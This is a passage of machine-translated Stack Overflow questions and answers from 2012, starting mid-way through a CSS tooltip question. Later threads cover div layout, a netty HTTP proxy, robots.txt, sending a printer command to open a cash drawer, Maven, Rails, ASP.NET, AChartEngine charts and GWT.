-webkit-box-shadow: 0px 2px 4px 1px rgba(0, 0, 0, 0.5);
-moz-box-shadow: 0px 2px 4px 1px rgba(0, 0, 0, 0.5);
box-shadow: 0px 2px 4px 1px rgba(0, 0, 0, 0.5);
}

span.tooltip:hover span.tip_basic
{
display: block;    
position: absolute;
left: 1em;
top: 2em;
z-index: 99;
margin-left: 0;
} 
```

现在让我感到困惑的是，如果我删除这些`position: absolute;`位，文本将恢复为正常显示（虽然弄乱了我的工具提示！），如下所示：

![工具提示2](../Images/40d8c534c27a16c97b0e88e5c150df1c.png)

任何人都可以向我解释它为什么会这样做以及是否有办法阻止它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T11:44:12.403

我不是东亚语言方面的专家，但据我所知，它们可以在字符之间换行。

您的代码中的某些内容是让工具提示“收缩包装”尽可能小。最好的办法是找到导致它的属性（据我所知，它不包含在您发布的代码中），或者如果您找不到它，请为您的工具提示指定特定宽度。

或者使用 CSS 来停止包装，例如[white-space](https://developer.mozilla.org/en/CSS/white-space)。我认为还有其他 CSS 属性会特别影响东亚语言的换行，但我现在不记得它们了。编辑：找到它：见[分词](https://developer.mozilla.org/en/CSS/word-break)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-03-14T17:13:50.703

尝试使用`word-break: keep-all` [ *keep-all*：中文/日文/韩文 (CJK) 文本不应使用分词符。非 CJK 文本行为与值 "normal"] 相同。在 Chrome/firefox/Safari 上进行了测试。似乎工作正常。

# html - 如何将这些 div 放入 div 中以占据整个水平宽度

> ID：11309044
> 
> 赞同：0
> 
> 时间：2012-07-03T10:31:02.697
> 
> 标签：html, css

如何将这 3 个子框 ( `2 .child, 1 .screen`) 放入父 ( `.parentDiv`) 中以完美占据水平空间。

我不想使用 javascript 来执行此操作。小提琴供参考，我想要的就[在这里](http://jsfiddle.net/ashwyn/s3zUd/)

**HTML：**

```
<div id="parentDiv">
    <div class="child"></div>
    <div class="child"></div>
    <div class="screen"></div>
</div>​ 
```

.screen 元素可以在之前或之后或中间元素。

**CSS：**

```
#parentDiv {width:600px; height:400px; margin:10px auto; border:1px solid #000}

.child {width:100px; border:1px solid blue; float:left; height:100%}
.screen {float:left; border:1px solid red; height:100%;}

.child, .screen {
    box-sizing:border-box;
    -moz-box-sizing:border-box; /* Firefox */
    -webkit-box-sizing:border-box; /* Safari */
}
​ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:23:18.607

打开`.screen`，添加`overflow: hidden`和删除`float: left`。

**见：http:** [//jsfiddle.net/thirtydot/s3zUd/1/](http://jsfiddle.net/thirtydot/s3zUd/1/)

[更多信息。](http://colinaarts.com/articles/the-magic-of-overflow-hidden/#making-room-for-floats)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T10:50:46.683

您的链接无效。也许，您正在寻找的解决方案是浮动。浮动可帮助您在不使用表格或 CSS 定位的情况下定位元素。更多关于花车[的信息在这里](http://www.w3schools.com/css/css_float.asp)

```
<div class="container">
<div class="child1"></div>
  <div class="child2"></div>
  <div class="screen"></div>
</div> 
```

CSS：

```
.container{width:100%; height:100%;}
.child1{float:left; width:25%; height:100%;}
.child2{width:30%; height:100%;}
.screen{width:45%; height:100%;} 
```

功能

```
 function resize()(
{
var mydiv = document.getElementById("child1");
var curr_width = parseInt(mydiv.style.width);

var mydiv2 = document.getElementById("child1");
var curr_width2 = parseInt((mydiv.style.width);

document.getElementById("screen").style.width=(avaliablewidth-curr_width-curr_width2)+"px";
} 
```

**CSS3 解决方案**将容器宽度设置为可用宽度并将其添加到您的每个子元素

```
box-sizing:border-box;
-moz-box-sizing:border-box; /* Firefox */
-webkit-box-sizing:border-box; /* Safari */
width:30%//Whatevet width you want it to have
float:left; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T10:47:32.110

小提琴页面没有为我加载。您是否试图在它们之间平均分配父级的宽度？如果是这样，您是否尝试将它们的宽度设置为 33.33%？

```
.child
{
    width: 33.33%;
}

.screen
{
    width: 33.33%;
} 
```

或者，就此而言，任何 2*child.width + screen.width = 100% 的值集。

# http - 编写多个 http 响应是否有任何限制？

> ID：11309045
> 
> 赞同：1
> 
> 时间：2012-07-03T10:31:05.413
> 
> 标签：http, proxy, netty, pipelining

我正在用 netty 构建一个[HTTP 代理](https://github.com/JHK/jLange)，它支持 HTTP 流水线。因此，我`HttpRequest`在单个通道上接收到多个对象并获得了匹配的`HttpResponse`对象。写入的顺序`HttpResponse`与我得到的相同`HttpRequest`。如果 a`HttpResponse`被写入，下一个将在`HttpProxyHandler`收到`writeComplete`事件时写入。

管道应该很方便：

```
final ChannelPipeline pipeline = Channels.pipeline();
pipeline.addLast("decoder", new HttpRequestDecoder());
pipeline.addLast("encoder", new HttpResponseEncoder());
pipeline.addLast("writer", new HttpResponseWriteDelayHandler());
pipeline.addLast("deflater", new HttpContentCompressor(9));
pipeline.addLast("handler", new HttpProxyHandler()); 
```

关于[这个问题](https://stackoverflow.com/questions/9082101/do-messages-sent-via-nettys-channel-write-preserve-their-order-when-begin-sen)，只有写入调用的顺序很重要，但要确保我构建了另一个 Handler ( `HttpResponseWriteDelayHandler`)，它会抑制`writeComplete`事件，直到写入整个响应。

为了测试这一点，我在 Firefox 中启用`network.http.proxy.pipelining`并访问了一个包含许多图像和连接的页面（[一个新闻页面](http://www.spiegel.de)）。问题是，浏览器没有收到一些响应，尽管代理的日志认为它们已成功发送。

我有一些发现：

*   仅当从代理到服务器的连接比从代理到浏览器的连接快时才会出现此问题。
*   在该连接上发送更大的图像（例如 20kB）后，问题更常发生
*   如果仅发送响应，则不会发生此问题`304 - Not Modified`（刷新页面考虑浏览器缓存）
*   设置`bootstrap.setOption("sendBufferSize", 1048576);`或以上没有帮助
*   `writeComplete`在发送事件之前休眠一个取决于响应正文大小的时间帧`HttpResponseWriteDelayHandler`可以解决问题，但这是一个非常糟糕的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-12T05:31:45.690

我找到了解决方案并想分享它，如果其他人有类似的问题：

的内容`HttpResponse`太大了。为了分析整个 HTML 文档在缓冲区中的内容。这必须再次拆分为块才能正确发送。如果`HttpResponse`没有分块，我写了一个简单的解决方案来做到这一点。需要在逻辑处理程序旁边放置一个`ChunkedWriteHandler`并编写此类而不是响应本身：

```
public class ChunkedHttpResponse implements ChunkedInput {

    private final static int       CHUNK_SIZE = 8196;
    private final HttpResponse     response;
    private final Queue<HttpChunk> chunks;
    private boolean                isResponseWritten;

    public ChunkedHttpResponse(final HttpResponse response) {
        if (response.isChunked())
            throw new IllegalArgumentException("response must not be chunked");

        this.chunks = new LinkedList<HttpChunk>();
        this.response = response;
        this.isResponseWritten = false;

        if (response.getContent().readableBytes() > CHUNK_SIZE) {
            while (CHUNK_SIZE < response.getContent().readableBytes()) {
                chunks.add(new DefaultHttpChunk(response.getContent().readSlice(CHUNK_SIZE)));
            }
            chunks.add(new DefaultHttpChunk(response.getContent().readSlice(response.getContent().readableBytes())));
            chunks.add(HttpChunk.LAST_CHUNK);

            response.setContent(ChannelBuffers.EMPTY_BUFFER);
            response.setChunked(true);
            response.setHeader(HttpHeaders.Names.TRANSFER_ENCODING, HttpHeaders.Values.CHUNKED);
        }
    }

    @Override
    public boolean hasNextChunk() throws Exception {
        return !isResponseWritten || !chunks.isEmpty();
    }

    @Override
    public Object nextChunk() throws Exception {
        if (!isResponseWritten) {
            isResponseWritten = true;
            return response;
        } else {
            HttpChunk chunk = chunks.poll();
            return chunk;
        }
    }

    @Override
    public boolean isEndOfInput() throws Exception {
        return isResponseWritten && chunks.isEmpty();
    }

    @Override
    public void close() {}
} 
```

然后可以调用just `channel.write(new ChunkedHttpResponse(response)`，如果需要，分块会自动完成。

# windows-phone-7 - 实现评论功能

> ID：11309046
> 
> 赞同：-1
> 
> 时间：2012-07-03T10:31:05.513
> 
> 标签：windows-phone-7

我想实现人们可以评论图片的可能性，该图片在应用程序中显示给他们。并且所有其他用户都可以看到评论。

我正在考虑使用放置评论的 xml 文件。并且每次应用程序启动时，都会打开这个 xml 文件并显示评论。

像这样的东西会起作用吗？还是有更好的可能性？

另一件事是，将这个 xml 文件保存在哪里？它可以从应用程序自动上传到skydrive / Dropbox吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-06T13:07:04.850

您可以将 xml 保存在 SkyDrive 中。看看 Live SDK：

[http://msdn.microsoft.com/en-us/live/ff621310](http://msdn.microsoft.com/en-us/live/ff621310)

（请记住，如果您使用读写超链接共享文件，则能够查看此链接的每个人都可以读取和编辑您的 xml 文件。也许您可以仅为您的应用程序创建一个 Live-ID 以访问 SkyDrive 文件夹和文件。）

# linux - 没有机器人 robots.txt 位置

> ID：11309048
> 
> 赞同：0
> 
> 时间：2012-07-03T10:31:11.957
> 
> 标签：linux, apache, ubuntu, web, robots.txt

与 robots.txt 有点混淆。

假设我想在基于 Linux 的 Apache 服务器上的某个站点上阻止机器人：

```
var/www/mySite 
```

我会将 robots.txt 放在包含以下内容的目录中（与 index.php 一起）：

```
User-agent: *
Disallow: / 
```

正确的？

这是否会阻止机器人索引整个服务器或只是 var/www/mySite 中的站点？例如，var/www/myOtherSite 中的站点是否也会阻止机器人？因为我只想为一个站点做这件事。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T10:37:44.307

机器人（表现良好的机器人，即——尊重`robots.txt`完全是自愿的）将使用在`robots.txt`您域的根目录中找到的。如果`mySite`is serving off`mysite.com`和`myOtherSite`is serving off `myothersite.com`，那么你`robots.txt`只会被送达`mysite.com`并且这会按预期工作。

要进行测试，只需前往`http://myothersite.com/robots.txt`并验证您是否获得了 404。

# java - 使用 JAVA 或批处理文件打开钱箱

> ID：11309054
> 
> 赞同：1
> 
> 时间：2012-07-03T10:31:40.787
> 
> 标签：java, batch-file, thermal-printer

我有一台合作伙伴 RP-300 收据打印机，它连接了一个现金抽屉，用于实验目的。它通过 LPT1 连接到 PC。

我想通过 java 应用程序或批处理文件打开钱箱。

有任何想法吗？

编辑我发现打开抽屉的命令是ESC p，十六进制值\x1b\x70\x00，

但是如何使用 cmd 将该命令发送到打印机？我尝试将后者放入文本文件中，然后使用复制 \b 文件名 lpt1，但它只是在打印机上打印文本文件的内容。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-06T11:34:44.380

我查看了手册，该命令包括另外两个参数，脉冲打开和脉冲关闭。这里也有很好的解释：[如何编程现金抽屉以打开](http://www.beaglehardware.com/howtoprogramcashdrawer.html)。所以命令是`ESC p m t1 t2`，其中 m 与连接器引脚有关，t1、t2 是高/低时间。你只发送`ESC p 0 (\x1b\x70\x00)`，而你应该做例如。`ESC p 0 25 250 (\x1b\x70\x00\x19\xfa)`

copy /b 是向打印机发送控制命令的完全有效方式，它应该可以工作。

只需使用任何十六进制编辑器确保您的文件确实包含正确的十六进制序列。

希望这可以帮助

编辑：[链接到技术手册](http://www.partnertechcorp.com/files/ptu/support/RP300/RP-300%20Technica%20Manual%20V11%20.pdf)

编辑：要获得在文件中编码的命令序列（长而简单）：
1\. 获取 Notepad++
2\. 检查您是否在插件下安装了转换器。如果没有，找到并安装它
3\. 在 Notepad++ 中创建新文件
4\. 在编码下选择 ANSI
5\. 输入 1b700019fa

6\. 选择（突出显示）您输入的字符串（或使用 Ctl-A 全选）
7\. 转到插件->转换器-> HEX --> ASCII
8。你应该看到乱码输出（里面有字母 p）。保存
9\. 将文件发送到打印机。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-06T21:36:46.537

您应该能够使用 RXTX 或 javax.comm(depriated) 将二进制命令发送到 LPT 端口。

[http://rxtx.qbang.org/wiki/index.php/Using_RXTX](http://rxtx.qbang.org/wiki/index.php/Using_RXTX)

[http://rxtx.qbang.org/wiki/index.php/Parallel_Communications](http://rxtx.qbang.org/wiki/index.php/Parallel_Communications)

# maven-3 - 使用本地存储库中的文件构建 Maven 项目

> ID：11309056
> 
> 赞同：0
> 
> 时间：2012-07-03T10:31:52.413
> 
> 标签：maven-3

我在本地存储库中安装了两个库（JGraph 和 JGraphtT）。我使用了这个命令：

```
mvn install:install-file -DgroupId=org.jgrapht -DartifactId=jgrapht -Dversion=0.8.3 -Dpackaging=jar -Dfile=./jgrapht.jar 
```

和 JGraph 类似。我可以看到这两个 Jar 文件在我的本地存储库中。

当我尝试从项目的 POM 文件目录创建 Eclipse 类路径并构建文件时（使用 mvn eclipse:eclipse），我收到此错误：

> [警告] org.jrapht:jgrapht:jar:0.8.3 缺少 POM

和 JGraph 类似。

关于我做错了什么的任何想法？我的 settings.xml 文件启用了本地存储库。

谢谢，基思

# overflow - 为什么“nowrap”div 中的“inline-block”元素会溢出？

> ID：11309058
> 
> 赞同：15
> 
> 时间：2012-07-03T10:32:06.703
> 
> 标签：overflow, css, nowrap

以下代码导致#headline 溢出#wrapper，我不明白为什么会这样。

HTML：

```
<div id="wrapper">
    <div id="logo">
        <img src="/test.png">
    </div>
    <div id="headline">
        <h1>This headline overflows its wrapping div. # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #</h1>
    </div>
</div> 
```

CSS：

```
#wrapper {
    background: #fea;
    white-space: nowrap;
    width: 50%;
}

#logo {
    display: inline-block;
    vertical-align: middle;
}

#logo img {
       width: 6em; 
}

#headline {
     display: inline-block;
     vertical-align: middle;
     white-space: normal;
} 
```

示例代码：http: [//jsfiddle.net/XjstZ/21/](http://jsfiddle.net/XjstZ/21/)或[http://tinkerbin.com/XvSAEfrK](http://tinkerbin.com/XvSAEfrK)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2018-01-08T18:36:00.250

顾名思义，内联块参与内联布局，这意味着它们的行为就像内联元素和文本一样。`white-space: nowrap`通过阻止元素换行导致文本在元素中溢出；内联块也会发生同样的事情。就是这么简单。

事实上，`#headline`它对`white-space: normal`自己的布局没有影响。一个元素的`white-space`属性会影响其内容的布局，而不是它本身，即使元素自己的盒子是内联级别的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-09T14:34:48.347

您需要在包装元素中使用“溢出：隐藏”

```
#wrapper {
background: #fea;
white-space: nowrap;
width: 50%;
overflow: hidden; 
```

}

我在 jsfiddle [http://jsfiddle.net/XjstZ/72/中更新了您的示例](http://jsfiddle.net/XjstZ/72/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-27T13:22:16.173

将宽度设置为标题元素可以解决此问题。

```
#headline {
   display: inline-block;
   vertical-align: middle;
   width: 60%;
} 
```

如果图像包装器和图像都定义了它们的最大宽度，则它是响应式的。

```
#logo {
   display: inline-block;
   vertical-align: middle;
   max-width: 35%;
}

#logo img {
   width: 6em;
   max-width: 100%;
} 
```

[http://jsfiddle.net/tt1k2xmL/](http://jsfiddle.net/tt1k2xmL/)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2017-12-07T03:32:40.477

此内容因`white-space: normal;`.

**white-space** CSS 属性确定如何处理元素内的空白。要使单词在自身内部中断，请改用`overflow-wrap`,`word-break`或连字符。现在，如果您想限制它，`#wrapper`则可以限制 div 的溢出属性。如果您使用`white-space: nowrap;`for div 这将清除溢出文本并在单行 (ROW) 中显示 div。

```
#wrapper {
    background: #fea;
    width: 50%;
    overflow: hidden;
}

#logo {
    display: inline-block;
    vertical-align: middle;
}

#logo img {
       width: 6em; 
}

#headline {
     display: inline-block;
     vertical-align: middle;

} 
```

# ruby-on-rails - Rails - 使用下拉列表中的信息为方法操作提供参数

> ID：11309059
> 
> 赞同：1
> 
> 时间：2012-07-03T10:32:07.820
> 
> 标签：ruby-on-rails, session, drop-down-menu, arguments

目前，我在项目/索引视图中有一个项目列表。当您单击项目旁边的“显示”时，它会转到该项目的显示视图。在那里，您可以单击“选择项目”，这会将那个项目的 id 传递到会话中，这样只有与该项目相关的相关任务才会显示在其他页面中。

我想要做的是为项目提供一个下拉菜单（这样您就不会只看到所有项目的巨大长表），并且在下拉菜单旁边有两个按钮 - 一个用于查看更多信息（即转到该项目的显示视图），然后选择“选择项目”。我怎样才能让他们拥有正确的信息（即项目ID），以便他们正常运行？谢谢！

以下是所有相关代码：

项目下拉列表：

```
<%= collection_select(:project, :id, Project.all, :id, :name) %> 
```

链接显示视图：

```
<%= link_to 'Show', project, :class =>"btn btn-primary btn-mini" %> 
```

链接到“选择项目”

```
<%= link_to 'Select Project', select_project_project_path(@project), :method => :post, :class => 'btn btn-primary btn-small' %> 
```

在项目控制器中选择项目操作：

```
def select_project
  project = Project.find(params[:id])
  session[:project_id] = project.id
  redirect_to root_url, notice: "Current project set to: #{project.name}, ID: #{project.id}"
end 
```

更新：

以下是相关路线：

```
resources :projects do
  member do
    post :select_project
  end
end 
```

以及 rake routes|grep 项目的结果：

```
 select_project_project POST   /projects/:id/select_project(.:format)  projects#select_proj
               projects GET    /projects(.:format)                     projects#index
                        POST   /projects(.:format)                     projects#create
            new_project GET    /projects/new(.:format)                 projects#new
           edit_project GET    /projects/:id/edit(.:format)            projects#edit
                project GET    /projects/:id(.:format)                 projects#show
                        PUT    /projects/:id(.:format)                 projects#update
                        DELETE /projects/:id(.:format)                 projects#destroy 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:26:21.413

那个怎么样？

```
<%= collection_select :project, :id, Project.all, :id, :name %>
<%= link_to "Show", @project, id: "show_project_btn" %>
<%= link_to "Select" select_project_project_path(@project), id: "select_project_btn" %>

<script type="javascript">
  $('#project_id').change(function(){
    var project_id = $(this).val();
    $('#show_project_button').attr('href', '/project/' + project_id);
    $('#select_project_button').attr('href', '/projects/' + project_id + '/select_project');
  })
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-19T16:13:00.953

您可以创建和使用不基于项目 ID 的“显示”和“选择项目”路由（并且不与 Rails 资源路由冲突），并继续将项目 ID 作为参数的一部分发送到控制器的操作中目的。

在 routes.rb 中，

```
get 'show_project', to: 'projects#show'
get 'select_project', to: 'projects#select_project' 
```

在您看来，请使用路径名称，例如`show_project_path`和`select_project_path`来提交您的请求。

# c# - 使用转发器的多个复选框列表

> ID：11309062
> 
> 赞同：0
> 
> 时间：2012-07-03T10:32:19.467
> 
> 标签：c#, asp.net, data-binding, repeater

以下是我显示 One Title 后跟 one 的代码`checkboxlist`。

标记：

```
<asp:Repeater id="repRoles" runat="server">
       <ItemTemplate>
              <asp:literal runat="server" text=<%# DataBinder.Eval(Container.DataItem, "ItemTitle") %>></asp:literal>
              <br />
              <asp:CheckBoxList runat="server" DataSourceID=<%# FillinCbl(DataBinder.Eval(Container.DataItem,"ItemID").ToString()) %> 
                                    DataTextField="ItemName" DataValueField="ItemValue">
              </asp:CheckBoxList>
       </ItemTemplate>
</asp:Repeater> 
```

后面的代码：

```
private void FillinRepeater()
{
    try
    {
        List<Item> targetAudienceParent = new List<Item>();
        DataTable tempTbl = new DataTable();
        tempTbl.Columns.Add("ItemTitle", typeof(String));
        tempTbl.Columns.Add("ItemID", typeof(String));
        DataRow tempRow;
        int tempCount = 0;
        foreach (Item a in itmECM.Children)
        {
            try
            {
                tempRow = tempTbl.NewRow();
                tempRow["ItemTitle"] = a.Name.ToString();
                tempRow["ItemID"] = a.ID.ToString();
                tempTbl.Rows.Add(tempRow);
                tempCount++;
            }
            catch
            {
            }
        }
        repRoles.DataSource = tempTbl;
        repRoles.DataBind();
    }
    catch
    {
    }
}
public DataTable FillinCbl(String passedString)
{
    dtlRoles = new DataTable();
    dtlRoles.Columns.Add("Name", typeof(String));
    dtlRoles.Columns.Add("OptInID", typeof(String));
    dtlRoles.Columns.Add("OptOutID", typeof(String));
    Item tempItm = master.GetItem(passedString);
    DataTable tempTbl = new DataTable();
    tempTbl.Columns.Add("ItemName", typeof(String));
    tempTbl.Columns.Add("ItemValue", typeof(String));
    DataRow tempRow;
    try
    {
        populateUsersList(tempItm);
        Session["dtlRoles"] = dtlRoles;
        for (int a = 0; a < dtlRoles.Rows.Count; a++)
        {
            try
            {
                Response.Write(dtlRoles.Rows[a][0].ToString().Trim() + "<br/>");
                tempRow = tempTbl.NewRow();
                tempRow["ItemName"] = dtlRoles.Rows[a][0].ToString().Trim();
                tempRow["ItemValue"] = dtlRoles.Rows[a][1].ToString().Trim();
                tempTbl.Rows.Add(tempRow);
            }
            catch(Exception ex1)
            {
                Response.Write(ex1.ToString() + "<br/>");
            }
        }
    }
    catch (Exception ex2)
    {
        Response.Write(ex2.ToString() + "<br/>");
    }
    return tempTbl;
} 
```

问题只是文字显示。`checkboxlist`没有填写。

当我`response.write()`为我的`DataBind`方法为`checobxlist`他们出局的时候。

所以我背后的代码正在工作。不过还是少了点什么。但我不知道是什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T10:39:35.273

将 DataSourceID 更改为 DataSource

```
<asp:CheckBoxList ID="CheckBoxList1" runat="server" DataSource=<%# FillinCbl(DataBinder.Eval(Container.DataItem,"ItemID").ToString()) %>  DataTextField="ItemName" DataValueField="ItemValue"> 
```

# android - 我的 Android AChartEngine 已经可以工作了，但是如何让它看起来不错呢？

> ID：11309065
> 
> 赞同：7
> 
> 时间：2012-07-03T10:32:39.793
> 
> 标签：android, achartengine

我想标题给出了我的大部分问题，但让我们详细介绍一下背景：

我有一个主要针对平板电脑的 Android 应用程序，它将在 TimeCharts 中显示一些不同的实时数据。所以我已经有一个服务来与抓取数据的数据源进行通信，解析它并将值添加到单例 TimeSeries。当用户导航进出片段时，片段只需添加正确的 TimeSeries 并保持`mChartView.repaint();`每 500 毫秒调用一次

所有这些都是可操作的，并且可以在选项卡、轮换、通知等方面很好地工作。

因为它是一个平板应用程序，所以我想实现两件事：1）最大化查看区域；2）让它看起来不错。

1）我已经删除了缩放按钮（出于某种原因，如果我尝试添加它们，它会给我 NullException），`mRenderer.setZoomButtonsVisible(false);`但仍然有一个巨大的底部边距占用大量屏幕空间。我尝试设置一个负边框，它可以工作，但是标签不会随着这个边框移动，最终我的 X 轴会越过标签甚至通过它们。如何将标签与边框一起向下移动，或者将它们放在图表的顶部？

2) a) 用户可将应用配置为使用 Holo_Dark 或 Holo_light。所以我在渲染器上使用透明背景（见下面的片段）来显示全息的漂亮背景阴影。如何更改轴文本颜色？我找到了，`mRenderer.setAxesColor(color)`但它只改变了行，而不是文本。

```
 int color = Color.argb(0, 255, 255, 255); // Transparent colour
    mRenderer.setBackgroundColor(color);
    mRenderer.setMarginsColor(color); 
```

b) Y 轴在它的标签上交叉，我怎样才能将它们向左偏移一点，以便文本可读？（不是与`setMargins()`）

c) 当用户缩放和平移图表时，图表停止更新/重新缩放屏幕上的最新值，用户必须继续平移才能看到最新值。我在 ActionBar 上添加了一个“重置缩放”按钮，但我无法让它工作。使值再次更新的代码是什么。

d）如果我的 TimeSeires 的范围为 10 分钟（每秒 2 个值），我怎样才能让它只显示最后 1 分钟（例如），如果用户想要以前的值，他可以平移回来？（和 c 上的使用按钮）重新启动）

目前我的渲染设置为：

```
 int color = Color.argb(0, 255, 255, 255); // Transparent colour
    mRenderer.setBackgroundColor(color);
    mRenderer.setMarginsColor(color);
    mRenderer.setAxisTitleTextSize(16); // 16
    mRenderer.setChartTitleTextSize(20); // 20
    mRenderer.setLabelsTextSize(15); // 15
    mRenderer.setLegendTextSize(15); // 15
    mRenderer.setPointSize(0); // 10
    mRenderer.setMargins(new int[] { 20, 30, 15, 0 });      
    mRenderer.setZoomButtonsVisible(false);
    mRenderer.setShowAxes(true);
    mRenderer.setShowLegend(true);
    mRenderer.setShowGridX(true);
    mRenderer.setShowLabels(true); 
```

添加到多重渲染器的每个渲染如下：

```
 renderer.setDisplayChartValues(false);
    mRenderer.addSeriesRenderer(renderer); 
```

非常感谢所有的帮助！

**编辑只是为了包含我的最终代码供其他人查看：**

我最终完全放弃了图例，并在图表上方实现了我自己的图例，因此布局是带有 ChartView 和 TableLayout 的 FrameLayout。

我实现了一个由几个类扩展的抽象 CurvesFragment 类。

我在片段 OnCreateView 期间将图表配置为：

```
 mChartView = ChartFactory.getTimeChartView(getActivity().getApplicationContext(), mDataset, mRenderer, "HH:mm:ss"); // X axis in a time scale
    // Setup chart renderer =============================
    mRenderer.setLabelsTextSize(15); // Text size
    mRenderer.setMargins(new int[] { 0, Utils.convertToPx(5, getActivity().getApplicationContext()), 0, 0 }); // 5dp on the left to show that little line
    mRenderer.setZoomButtonsVisible(false); // bye bye zoom
    mRenderer.setShowAxes(true); // show both axes
    mRenderer.setShowLegend(false); // bye bye legend
    mRenderer.setShowGridX(true); // X grid helps identify values
    mRenderer.setShowLabels(true); // See the values
    mRenderer.setYLabelsAlign(Align.LEFT); // put the Y labels on the left of the axis
    if (Utils.getCurrentTheme(getActivity().getApplicationContext()) == android.R.style.Theme_Holo) {
        mRenderer.setXLabelsColor(getResources().getColor(android.R.color.primary_text_dark));
        mRenderer.setYLabelsColor(0, getResources().getColor(android.R.color.primary_text_dark));
        mRenderer.setMarginsColor(getResources().getColor(android.R.color.background_dark));
        legend.setBackgroundResource(R.drawable.border_dark);
    } else {
        // same as above but for Holo_light
    }
  // And from here proceed to add the TimeCharts with using
  renderer.setDisplayChartValues(false); 
```

在我的操作栏上，我包含了暂停/恢复和重置缩放按钮。重置缩放很简单：

```
 mRenderer.setXAxisMax(-Double.MAX_VALUE);
        mRenderer.setXAxisMin(Double.MAX_VALUE);
        mRenderer.setYAxisMax(-Double.MAX_VALUE);
        mRenderer.setYAxisMin(Double.MAX_VALUE);
        mChartView.repaint(); 
```

有一个后台服务保存对 TimeSeries 的引用，该引用始终从 WiFi 读取新数据并将它们添加到系列中。这样，在片段中有一个每 700 毫秒执行一次的可运行文件，它调用 repaint() 为：

```
// Chart rendering control ========================
private Runnable updateDataSet = new Runnable() {

    public void run() {
        if (!chartPaused) {

            double max = mRenderer.getXAxisMax(); // get renderer maximum value
            double min = mRenderer.getXAxisMin(); // get renderer minimum value

            // Check if the user scrolled/zoomed/panned the graph or if it's on 'auto'
            if (!((max == Double.MAX_VALUE || max == -Double.MAX_VALUE) && (min == Double.MAX_VALUE || min == -Double.MAX_VALUE))) {

                double newMax = mDataset.getSeriesAt(0).getMaxX(); // new max is the latest value from our series
                double newMin = newMax - Math.abs(max - min); // new min value is the X range the user zoomed into
                mRenderer.setXAxisMax(newMax); // set the new values
                mRenderer.setXAxisMin(newMin);
            }

            // Logic that updates the TableLayout with the legend is placed here

            mChartView.repaint();
        }

        getView().postDelayed(updateDataSet, 700);
    }
}; 
```

并且有一个 ZoomListener 和一个 PanListener 可以在用户每次触摸图表时暂停图表。这样，用户可以缩放和平移，但每当它恢复图表更新时，它只会向前滚动到最早的数据而不改变缩放级别。

我猜最终的结果非常可靠，并且在 Holo_Light 和 Holo_Dark 上看起来都不错。

非常感谢**Dan**的回答以及创建引擎的所有其他开发人员。

快乐编码！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-09T07:35:46.607

问题 1\. 您可以尝试使用这些 API 调用：

```
mRenderer.setShowLegend(false); 
```

或者

```
mRenderer.setMargins(new int[] {top, left, bottom, right}); 
```

也许降低底部值？

问题 2\. a)

```
mRenderer.setXLabelsColor();
mRenderer.setYLabelsColor(); 
```

b)

```
mRenderer.setXLabelsAlign(); 
```

C）

当系列获得新值时，我认为您可以执行以下操作：

```
mRenderer.setXAxisMin();
mRenderer.setXAxisMax(); 
```

提供 x min 和 x max 值作为要显示的范围并调用 mChartView.repaint(); 之后。

d) 同 c)

作为一个建议，请尝试将这么长的问题分成几个较小的问题，您可能会更快地得到答案。知道如何回答所有问题的 ACE 用户并不多。甚至这个图书馆的作者也不得不考虑一些答案:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-06T12:02:01.827

删除该图表的滚动：mRenderer.setZoomEnabled(false); mRenderer.setPanEnabled(false);

# gwt - GWT-Youtube-API 没有可用于 YouTubeEmbeddedPlayer 的源代码

> ID：11309072
> 
> 赞同：1
> 
> 时间：2012-07-03T10:32:56.700
> 
> 标签：gwt, youtube, youtube-api

我试图在我的 GWT 项目中嵌入视频，但是当我打开包含视频的面板时，我的控制台中出现以下错误：

```
No source code is available for type com.google.youtube.client.YouTubeEmbeddedPlayer; did you forget to inherit a required module? 
```

[我的项目构建路径](http://img6.imagebanana.com/img/f2f0hnqs/Selection_003.jpeg)

这是示例代码

```
 YouTubeEmbeddedPlayer youTubeEmbeddedPlayer = new YouTubeEmbeddedPlayer("hqXUKxJiDls");
    youTubeEmbeddedPlayer.setWidth("427px");
    youTubeEmbeddedPlayer.setHeight("320px");
    absolutePanel.add(youTubeEmbeddedPlayer, 200, 30); 
```

项目.gwt.xml：

```
 <inherits name="com.google.gdata.YouTubeAPI" />
    <inherits name="com.google.youtube.Player" /> 
```

我关注了 GettingStarted wiki 条目，但我不知道将 settings.xml 放在哪里（没有解释）。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T16:31:41.373

尝试将*gwt-youtube-api-1.0.3-sources.jar*作为标准库添加到您的类路径中，而不是将其添加为*gwt-youtube-api-1.0.3.jar*的源附件。

# java - JDK 1.4 的简单 Web 服务示例

> ID：11309073
> 
> 赞同：-1
> 
> 时间：2012-07-03T10:32:58.883
> 
> 标签：java, web-services, soap, jdk1.4

任何人都可以帮助我学习使用 jdk 1.4 开发 Web 服务吗？

我仅限于 JDK 1.4，所以我不能使用使用注释的 Web 服务。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T11:01:52.070

[Axis](http://axis.apache.org/axis/java/building-axis.html)的第一个版本 需要 JDK 版本 - 1.3.1+

